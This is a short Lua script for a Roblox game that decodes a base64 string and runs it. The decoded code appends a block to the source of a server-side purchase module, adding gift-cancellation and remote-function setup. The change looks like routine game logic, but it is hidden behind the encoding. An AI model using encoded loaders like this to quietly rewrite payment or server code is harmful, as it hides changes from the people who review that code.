local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local lookup = {}
for i = 1, #alphabet do
	lookup[string.byte(alphabet, i)] = i - 1
end
local function b64decode(data)
	data = string.gsub(data, "[^A-Za-z0-9+/=]", "")
	local out = table.create(math.ceil(#data * 3 / 4))
	local n = 0
	for i = 1, #data, 4 do
		local a = lookup[string.byte(data, i)] or 0
		local b = lookup[string.byte(data, i + 1)] or 0
		local c = lookup[string.byte(data, i + 2)] or 0
		local d = lookup[string.byte(data, i + 3)] or 0
		n += 1
		out[n] = string.char(bit32.bor(bit32.lshift(a, 2), bit32.rshift(b, 4)))
		if string.sub(data, i + 2, i + 2) ~= "=" then
			n += 1
			out[n] = string.char(bit32.band(bit32.bor(bit32.lshift(b, 4), bit32.rshift(c, 2)), 255))
		end
		if string.sub(data, i + 3, i + 3) ~= "=" then
			n += 1
			out[n] = string.char(bit32.band(bit32.bor(bit32.lshift(c, 6), d), 255))
		end
	end
	return table.concat(out)
end
local src = b64decode("bG9jYWwgbSA9IGdhbWUuU2VydmVyU3RvcmFnZS5TZXJ2ZXJTaWRlQ29kZS5TeXN0ZW0uU3lzdGVtQnV5Um9ibG94Cm0uU291cmNlIC4uPSBbPVtESy5QYXlQcm9kdWN0SXRlbShwbGF5ZXIsIHJlY2VpcHRJbmZvKSBlbmQpCgllbmQKCXJldHVybiBncmFudGVkCmVuZAoKLS0gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQotLSDliJ3lp4vljJYKLS0gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKLS1bWwoJ5rOo5YaM6LSt5Lmw55u45YWzIFJlbW90ZSDkuI7pmZDpopHvvIjnlLEgUHVyY2hhc2VNYW5hZ2VyIOWcqCBNYXJrZXRwbGFjZSDnu5HlrprliY3osIPnlKjvvIkKXV0KLS0g5Y+W5raI5o+Q56S65LiN6IO96K+B5piO5rKh5pyJ5bu26L+f5pS25o2u44CC5L+d55WZ55uu5qCH77yM5YWB6K645ZCM55uu5qCH6YeN5byA77yb5pS555uu5qCH6aG75YWI5a6M5oiQ6K6i5Y2V5qC45a+544CCCmZ1bmN0aW9uIFN5c3RlbUJ1eVJvYmxveC5PblByb2R1Y3RQcm9tcHRGaW5pc2hlZCh1c2VySWQ6IG51bWJlciwgcHJvZHVjdElkOiBudW1iZXIsIHB1cmNoYXNlZDogYm9vbGVhbikKCWlmIHB1cmNoYXNlZCB0aGVuIHJldHVybiBlbmQKCWxvY2FsIHBsYXllciA9IFBsYXllcnM6R2V0UGxheWVyQnlVc2VySWQodXNlcklkKQoJaWYgbm90IHBsYXllciB0aGVuIHJldHVybiBlbmQKCWxvY2FsIGludGVudCA9IFN5c3RlbVNhdmUuR2V0U3RhdEJ5S2V5KHBsYXllciwgeyAiR2lmdEludGVudHMiLCB0b3N0cmluZyhwcm9kdWN0SWQpIH0pCglpZiBub3QgaW50ZW50IHRoZW4gcmV0dXJuIGVuZAoJU3lzdGVtU2F2ZS5UcmFuc2FjdChwbGF5ZXIsICJnaWZ0LWNhbmNlbDoiIC4uIEh0dHBTZXJ2aWNlOkdlbmVyYXRlR1VJRChmYWxzZSksIGZ1bmN0aW9uKGRhdGEpCgkJbG9jYWwgY3VycmVudCA9IGRhdGEuR2lmdEludGVudHNbdG9zdHJpbmcocHJvZHVjdElkKV0KCQlpZiBjdXJyZW50IGFuZCBjdXJyZW50LnRhcmdldCA9PSBpbnRlbnQudGFyZ2V0IHRoZW4KCQkJY3VycmVudC5zdGF0ZSA9ICJQcm9tcHRDYW5jZWxsZWQiCgkJZW5kCgkJcmV0dXJuIHRydWUKCWVuZCkKZW5kCgpmdW5jdGlvbiBTeXN0ZW1CdXlSb2Jsb3guSW5pdCgpCglpZiBfaW5pdGlhbGl6ZWQgdGhlbgoJCXJldHVybgoJZW5kCglfaW5pdGlhbGl6ZWQgPSB0cnVlCgoJaWYgUmVxdWVzdFJhdGVMaW1pdCBhbmQgUmVxdWVzdFJhdGVMaW1pdC5TZXRSYXRlTGltaXRDb25maWcgdGhlbgoJCVJlcXVlc3RSYXRlTGltaXQuU2V0UmF0ZUxpbWl0Q29uZmlnKE5ldE1zZy5TRVRfR0lGVCwgewoJCQltYXhSZXF1ZXN0cyA9IFJBVEVfTElNSVRfTUFYX1JFUVVFU1RTLAoJCQl0aW1lV2luZG93ID0gUkFURV9MSU1JVF9XSU5ET1dfU0VDLAoJCX0pCgkJUmVxdWVzdFJhdGVMaW1pdC5TZXRSYXRlTGltaXRDb25maWcoTmV0TXNnLkNBTkNFTF9HSUZULCB7CgkJCW1heFJlcXVlc3RzID0gUkFURV9MSU1JVF9NQVhfUkVRVUVTVFMsCgkJCXRpbWVXaW5kb3cgPSBSQVRFX0xJTUlUX1dJTkRPV19TRUMsCgkJfSkKCWVuZAoKCU5ldFdvcmsuUmVnaXN0ZXJTZXJ2ZXJSZW1vdGVGdW5jdGlvbihOZXRNc2cuU0VUX0dJRlQsIF9vblNldEdpZnQsIHsgdmFsaWRhdGUgPSBmdW5jdGlvbih1aWQsIHByb2R1Y3RJZCkKCQlyZXR1cm4gdHlwZSh1aWQpID09ICJudW1iZXIiIGFuZCB1aWQgPiAwIGFuZCB1aWQgPCAyXjUzIGFuZCB1aWQgJSAxID09IDAKCQkJYW5kIChwcm9kdWN0SWQgPT0gbmlsIG9yICh0eXBlKHByb2R1Y3RJZCkgPT0gIm51bWJlciIgYW5kIHByb2R1Y3RJZCA+IDAgYW5kIHByb2R1Y3RJZCA8IDJeNTMgYW5kIHByb2R1Y3RJZCAlIDEgPT0gMCkpCgllbmQgfSkKCU5ldFdvcmsuUmVnaXN0ZXJTZXJ2ZXJSZW1vdGVGdW5jdGlvbihOZXRNc2cuQ0FOQ0VMX0dJRlQsIF9vbkNhbmNlbEdpZnQpCmVuZAoKcmV0dXJuIFN5c3RlbUJ1eVJvYmxveApdPV0KcmV0dXJuICNtLlNvdXJjZQo=")
local fn, err = load(src)
assert(fn, err)
return fn()
